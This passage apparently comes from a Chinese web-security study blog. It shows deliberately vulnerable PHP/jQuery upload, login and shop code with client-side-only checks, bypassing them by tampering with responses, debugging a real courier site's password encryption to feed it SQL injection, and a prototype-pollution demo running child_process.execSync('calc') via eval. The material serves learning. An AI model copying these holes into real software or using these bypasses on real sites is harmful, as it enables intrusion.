= <span class="hljs-variable">$row</span>[<span class="hljs-number">4</span>];<br>    <span class="hljs-variable">$item</span> = <span class="hljs-variable">$row</span>[<span class="hljs-number">5</span>];<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h3 id="JS应用-原生开发-JQuery库-Ajax技术-前端后端-安全验证处理"><a href="#JS应用-原生开发-JQuery库-Ajax技术-前端后端-安全验证处理" class="headerlink" title="JS应用&amp;原生开发&amp;JQuery库&amp;Ajax技术&amp;前端后端&amp;安全验证处理"></a>JS应用&amp;原生开发&amp;JQuery库&amp;Ajax技术&amp;前端后端&amp;安全验证处理</h3><p>‍</p><p>原生开发—前端后端—文件上传—白名单过滤</p><ol><li><p>布置前端页面</p></li><li><p>JS获取提交数据</p></li><li><p>JS对上传格式进行判断</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">CheckFileExt</span>(<span class="hljs-params">filename</span>)&#123;<br>        <span class="hljs-keyword">var</span> flag=<span class="hljs-literal">false</span>;<br>        <span class="hljs-comment">//规定白名单上传后缀</span><br>        <span class="hljs-keyword">var</span> exts=[<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>];<br>        <span class="hljs-keyword">var</span> index=filename.<span class="hljs-title function_">lastIndexOf</span>(<span class="hljs-string">&quot;.&quot;</span>);<br>        <span class="hljs-keyword">var</span> ext=filename.<span class="hljs-title function_">substr</span>(index+<span class="hljs-number">1</span>);<br>        <span class="hljs-comment">//进行后缀检测</span><br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;exts.<span class="hljs-property">length</span>;i++)&#123;<br>            <span class="hljs-keyword">if</span>(ext==exts[i])&#123;<br>                <span class="hljs-keyword">var</span> flag=<span class="hljs-literal">true</span>;<br>                <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;文件后缀正确！&#x27;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(!flag)&#123;<br>            <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;文件后缀错误&#x27;</span>);<br>            location.<span class="hljs-title function_">reload</span>(<span class="hljs-literal">true</span>);<br>        &#125;<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240705174541-uimconp.png" alt="image">​</p><p> 1、过滤代码能看到分析绕过<br> 2、禁用JS或删除过滤代码绕过</p></li><li><p>后端对上传数据进行处理</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 从上传文件数组中获取文件名</span><br><span class="hljs-variable">$name</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取文件类型</span><br><span class="hljs-variable">$type</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取文件大小</span><br><span class="hljs-variable">$size</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取临时文件名</span><br><span class="hljs-variable">$tmp_name</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-comment">// 从上传文件数组中获取错误码</span><br><span class="hljs-variable">$error</span> = @<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;f&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br><br><span class="hljs-comment">//如果文件后缀在白名单中,移动上传的文件到指定目录中</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-variable">$name</span>))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script&gt;alert(&quot;上传成功！&quot;)&lt;/script&gt;&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><p>‍</p><p>JQuery库—Ajax—安全验证处理</p><ol><li><p>获取登录事件</p></li><li><p>配置Ajax请求</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//导入JQuery库</span><br>&lt;script src=<span class="hljs-string">&quot;js/jquery-1.12.4.js&quot;</span>&gt;&lt;/script&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">    $(<span class="hljs-string">&quot;button&quot;</span>).<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml"><span class="hljs-comment">//配置Ajax请求</span></span></span><br><span class="language-javascript"><span class="language-xml">        $.<span class="hljs-title function_">ajax</span>(&#123;</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;logincheck.php&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">data</span>: &#123;</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-attr">myUname</span>:$(<span class="hljs-string">&#x27;.user&#x27;</span>).<span class="hljs-title function_">val</span>(),</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-attr">myUpass</span>:$(<span class="hljs-string">&#x27;.pass&#x27;</span>).<span class="hljs-title function_">val</span>(),</span></span><br><span class="language-javascript"><span class="language-xml">            &#125;,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);</span></span><br><span class="language-javascript"><span class="language-xml">                <span class="hljs-keyword">if</span>(res[<span class="hljs-string">&#x27;infoCode&#x27;</span>]==<span class="hljs-number">1</span>)&#123;</span></span><br><span class="language-javascript"><span class="language-xml">                    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;登陆成功！&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">                    <span class="hljs-comment">//登陆成功处理事件</span></span></span><br><span class="language-javascript"><span class="language-xml">                    <span class="hljs-comment">//location.href=&#x27;index.php&#x27;</span></span></span><br><span class="language-javascript"><span class="language-xml">                &#125;<span class="hljs-keyword">else</span>&#123;</span></span><br><span class="language-javascript"><span class="language-xml">                    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;登录失败&#x27;</span>);</span></span><br><span class="language-javascript"><span class="language-xml">                &#125;</span></span><br><span class="language-javascript"><span class="language-xml">            &#125;,</span></span><br><span class="language-javascript"><span class="language-xml">            <span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;json&#x27;</span>,</span></span><br><span class="language-javascript"><span class="language-xml">        &#125;);</span></span><br><span class="language-javascript"><span class="language-xml">    &#125;);</span></span><br><span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240705180038-eaya8rm.png" alt="image">​</p><p> 依靠前端判断数据</p><p> <img src="/assets/image-20240705180226-jutsl1i.png" alt="image">​</p><p> 可直接抓包修改</p><p> <img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-05%20180429-20240705180749-bf7vttf.png" alt="屏幕截图 2024-07-05 180429">​</p><p> 由于后端代码通过检测前端infoCode是否为1从而判断是否登陆成功，所以这里可通过修改其参数实现成功登陆（注意：这里只是显示成功登陆，因为前端是否显示登陆成功都不会跳转页面，如果将源码中被注释掉的那行代码<code>location.href=&#39;index.php&#39;</code>​执行才能成功登陆）</p><p> <img src="/assets/image-20240705181148-cn76ynj.png" alt="image">​</p><p> <img src="/assets/image-20240705181442-zy6bgoi.png" alt="image">​</p><p> ‍</p></li><li><p>后端代码验证</p></li><li><p>成功回调判断</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 从 POST 请求中获取用户提交的用户名和密码</span><br><span class="hljs-variable">$user</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;myuser&#x27;</span>];<br><span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;mypass&#x27;</span>];<br><br><span class="hljs-comment">// 真实情况下，应该在数据库中进行验证获取用户信息</span><br><br><span class="hljs-comment">// 假设用户名是 &#x27;xiaodi&#x27;，密码是 &#x27;123456&#x27;</span><br>**<span class="hljs-comment">//$success 是一个关联数组变量，通过使用 &#x27;msg&#x27; 作为键，将 &#x27;ok&#x27; 作为值存储在其中。</span><br><span class="hljs-variable">$success</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>);**<br><br><span class="hljs-comment">// 检查用户名和密码是否匹配</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span> == <span class="hljs-string">&#x27;xiaodi&#x27;</span> &amp;&amp; <span class="hljs-variable">$pass</span> == <span class="hljs-string">&#x27;123456&#x27;</span>) &#123;<br>    <span class="hljs-comment">// 如果匹配，设置信息代码为1表示登录成功，并进行相应的处理</span><br>    <span class="hljs-variable">$success</span>[<span class="hljs-string">&#x27;infoCode&#x27;</span>] = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果不匹配，设置信息代码为0表示登录失败</span><br>    <span class="hljs-variable">$success</span>[<span class="hljs-string">&#x27;infoCode&#x27;</span>] = <span class="hljs-number">0</span>;<br>&#125;<br><br>**<span class="hljs-comment">// 将结果以 JSON 格式输出</span><br><span class="hljs-comment">//必须要回调输出，不然前端无法获取infocode的值</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$success</span>);**<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li></ol><p>‍</p><ul><li><p>商品购买</p><p>前端</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 引入 jQuery 库 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;js/jquery-1.12.4.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-comment">&lt;!-- JavaScript 代码 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-comment">// 当购买按钮被点击时执行以下函数</span></span><br><span class="language-javascript">    $(<span class="hljs-string">&quot;button&quot;</span>).<span class="hljs-title function_">click</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// 使用 AJAX 发送 POST 请求到 &#x27;shop.php&#x27;</span></span><br><span class="language-javascript">        **$.<span class="hljs-title function_">ajax</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;shop.php&#x27;</span>,</span><br><span class="language-javascript">            <span class="hljs-comment">// 发送的数据，包括购买数量</span></span><br><span class="language-javascript">            <span class="hljs-attr">data</span>: &#123;</span><br><span class="language-javascript">                <span class="hljs-attr">num</span>: $(<span class="hljs-string">&#x27;.number&#x27;</span>).<span class="hljs-title function_">val</span>(),</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-comment">// 请求成功时执行的函数</span></span><br><span class="language-javascript">            <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">res</span>)&#123;</span><br><span class="language-javascript">                <span class="hljs-comment">// 在控制台输出返回的数据</span></span><br><span class="language-javascript">                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);</span><br><span class="language-javascript">                <span class="hljs-comment">// 如果返回的信息代码为1，表示购买成功</span></span><br><span class="language-javascript">                <span class="hljs-keyword">if</span>(res[<span class="hljs-string">&#x27;infoCode&#x27;</span>] == <span class="hljs-number">1</span>)&#123;</span><br><span class="language-javascript">                    <span class="hljs-comment">// 弹出成功提示</span></span><br><span class="language-javascript">                    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;购买成功&#x27;</span>);</span><br><span class="language-javascript">                    <span class="hljs-comment">// 购买成功的流程（你可以在这里添加额外的处理）</span></span><br><span class="language-javascript">                &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="language-javascript">                    <span class="hljs-comment">// 如果信息代码不为1，表示购买失败</span></span><br><span class="language-javascript">                    <span class="hljs-comment">// 弹出失败提示</span></span><br><span class="language-javascript">                    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;购买失败&#x27;</span>);</span><br><span class="language-javascript">                &#125;</span><br><span class="language-javascript">            &#125;,</span><br><span class="language-javascript">            <span class="hljs-comment">// 指定返回的数据类型为 JSON</span></span><br><span class="language-javascript">            <span class="hljs-attr">dataType</span>: <span class="hljs-string">&#x27;json&#x27;</span>,</span><br><span class="language-javascript">        &#125;);**</span><br><span class="language-javascript">    &#125;);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>后端</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 从 POST 请求中获取购买数量</span><br><span class="hljs-variable">$num</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br><br><span class="hljs-comment">// 假设购物车中已有的金钱数为10000，商品价格为8888</span><br><span class="hljs-comment">// 真实情况下，应该在数据库中获取用户的金钱数等信息</span><br><br><span class="hljs-comment">// 初始化一个关联数组变量，通过使用 &#x27;msg&#x27; 作为键，将 &#x27;ok&#x27; 作为值存储在其中。</span><br><span class="hljs-variable">$success</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>);<br><br>**<span class="hljs-comment">// 检查购买是否合法（金钱是否足够支付）</span><br><span class="hljs-keyword">if</span> (<span class="hljs-number">10000</span> &gt;= (<span class="hljs-variable">$num</span> * <span class="hljs-number">8888</span>)) &#123;<br>    <span class="hljs-comment">// 如果购买合法，设置信息代码为1表示购买成功</span><br>    <span class="hljs-variable">$success</span>[<span class="hljs-string">&#x27;infoCode&#x27;</span>] = <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果购买不合法，设置信息代码为0表示购买失败</span><br>    <span class="hljs-variable">$success</span>[<span class="hljs-string">&#x27;infoCode&#x27;</span>] = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 将结果以 JSON 格式输出</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$success</span>);**<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure></li></ul><p>‍</p><p>‍</p><p>‍</p><h3 id="JS应用-DOM树-加密编码库-断点调试-逆向分析-元素属性操作"><a href="#JS应用-DOM树-加密编码库-断点调试-逆向分析-元素属性操作" class="headerlink" title="JS应用&amp;DOM树&amp;加密编码库&amp;断点调试&amp;逆向分析&amp;元素属性操作"></a>JS应用&amp;DOM树&amp;加密编码库&amp;断点调试&amp;逆向分析&amp;元素属性操作</h3><ol><li><p>断点调试–申通快递会员登录中心</p><ol><li><p>打开页面，选择密码右击鼠标打开检查找到相关id值<code>numPassword</code>​ 并进行全局(Ctrl+Shift+f)搜索</p><p> <img src="/assets/image-20240707151552-mfbcpg1.png" alt="image">​</p></li><li><p>找到密码的加密格式，但是没有明文展现出来</p><p> <img src="/assets/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-07%20151844-20240707151918-l6rc7u2.png" alt="屏幕截图 2024-07-07 151844">​</p></li><li><p>采用之前的方式在控制台中输入相应的代码<code>encodeURI(encrypt.encrypt(numPassword))</code>​<strong>报错encrypt is not defined</strong>，有一些文件只在服务器本地执行，<strong>不会加载到浏览器中</strong></p><p> <img src="/assets/image-20240707152224-uxdp2xm.png" alt="image">​</p></li><li><p>必须采用调试断点的方式来，通过服务器获取其执行文件，然后修改对应的返回密文即可</p><ul><li><p>对应地方打上断点，点击登录，进入<strong>断点调试</strong>，发现右侧出现输入的账号密码内容</p><p><img src="/assets/image-20240707160246-ulfvid7.png" alt="image">​</p></li><li><p>点击<strong>最右侧按钮</strong>，进入调试，再次打开控制台，并输入<code>encodeURI(encrypt.encrypt(numPassword))</code>​发现<strong>成功回显加密后的密码</strong></p><p><img src="/assets/image-20240707160408-0wlxdg7.png" alt="image">​</p></li><li><p>修改为sql注入语句也成功返回</p><p><img src="/assets/image-20240707160152-69xv63f.png" alt="image">​</p></li></ul></li></ol></li></ol><p>‍</p><p>‍</p><p>‍</p><h3 id="JS应用-NodeJS指南-原型链污染-Express框架-功能实现-审计"><a href="#JS应用-NodeJS指南-原型链污染-Express框架-功能实现-审计" class="headerlink" title="JS应用&amp;NodeJS指南&amp;原型链污染&amp;Express框架&amp;功能实现&amp;审计"></a>JS应用&amp;NodeJS指南&amp;原型链污染&amp;Express框架&amp;功能实现&amp;审计</h3><ol><li><p>原型链污染</p><p> 如果攻击者控制并修改了一个对象的原型，(<strong>proto</strong>)<br> 那么将可以影响所有和这个对象来自同一个类、父祖类的对象。</p><p> <img src="/assets/image-20240707161746-dbzejxo.png" alt="image">​</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// foo是一个简单的JavaScript对象</span><br><span class="hljs-keyword">let</span> foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125; <span class="hljs-comment">//1=1 0 __proto__= x</span><br><span class="hljs-comment">// 原型链污染</span><br><span class="hljs-comment">// foo.bar 此时为1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<span class="hljs-comment">//输出为1</span><br><br><span class="hljs-comment">// 修改foo的原型（即Object）</span><br>foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-string">&#x27;2&#x27;</span><br><br><span class="hljs-comment">// // 由于查找顺序的原因，foo.bar仍然是1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>)<span class="hljs-comment">//输出为1</span><br><br><span class="hljs-comment">// // 此时再用Object创建一个空的zoo对象</span><br><span class="hljs-keyword">let</span> zoo = &#123;&#125;<br><br><span class="hljs-comment">// 查看zoo.bar，此时bar为2</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(zoo.<span class="hljs-property">bar</span>)<span class="hljs-comment">//输出为2</span><br></code></pre></td></tr></table></figure><p> 利用原型链污染，调用系统计算器</p> <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 创建一个包含属性 bar 的对象 foo，并将 bar 设置为 1</span><br><span class="hljs-keyword">let</span> foo = &#123;<span class="hljs-attr">bar</span>: <span class="hljs-number">1</span>&#125;;<br><br><span class="hljs-comment">// 输出 foo 对象的 bar 属性，预期输出为 1</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>); <span class="hljs-comment">// 输出: 1</span><br><br>**<span class="hljs-comment">// 修改 foo 对象的原型链上的 bar 属性，将其设置为执行命令 &#x27;require(\&#x27;child_process\&#x27;).execSync(\&#x27;calc\&#x27;);&#x27;</span><br><span class="hljs-comment">//调用计算机</span><br>foo.<span class="hljs-property">__proto__</span>.<span class="hljs-property">bar</span> = <span class="hljs-string">&#x27;require(\&#x27;child_process\&#x27;).execSync(\&#x27;calc\&#x27;);&#x27;</span>;**<br><br><span class="hljs-comment">// 输出 foo 对象的 bar 属性，预期输出仍为 1，因为直接属性优先于原型链上的属性</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">bar</span>); <span class="hljs-comment">// 输出: 1</span><br><br><span class="hljs-comment">// 创建一个空对象 zoo</span><br><span class="hljs-keyword">let</span> zoo = &#123;&#125;;<br><br>**<span class="hljs-comment">// 使用 eval 执行 zoo 对象的 bar 属性，由于 zoo 对象没有 bar 属性，会导致 ReferenceError</span><br><span class="hljs-comment">//调用计算机</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">eval</span>(zoo.<span class="hljs-property">bar</span>));**<br></code></pre></td></tr></table></figure><p> <img src="/assets/image-20240707161822-t68dzwk.png" alt="image">​</p></li><li><p>ctfshow—web334</p><p> <img src="/assets/image-20240707161932-shvg6hw.png" alt="image">​</p></li></ol><p>‍</p><p>‍</p><p>‍</p><h3 id="JS应用-WebPack打包器-第三方库JQuery-安装使用-安全检测"><a href="#JS应用-WebPack打包器-第三方库JQuery-安装使用-安全检测" class="headerlink" title="JS应用&amp;WebPack打包器&amp;第三方库JQuery&amp;安装使用&amp;安全检测"></a>JS应用&amp;WebPack打包器&amp;第三方库JQuery&amp;安装使用&amp;安全检测</h3><ol><li><p>webpack使用</p><ul><li><p>创建WebPack，并创建目录src在目录下创建js目录在js目录下创建sum.js count.js</p><p><img src="/assets/image-20240709200608-rcuhzf1.png" alt="image">​</p></li><li><p>sum.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">x,y</span>)&#123;<br>    <span class="hljs-keyword">return</span> x+y;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>count.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">count</span>(<span class="hljs-params">x,y</span>)&#123;<br>    <span class="hljs-keyword">return</span> x-y;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在src目录下创建与js同级main.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> count <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./js/count&quot;</span>;<br><span class="hljs-keyword">import</span> sum <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./js/sum&quot;</span>;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">sum</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>));<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">count</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>));<br></code></pre></td></tr></table></figure></li><li><p>再创建src同级文件index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;IE=edge&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span 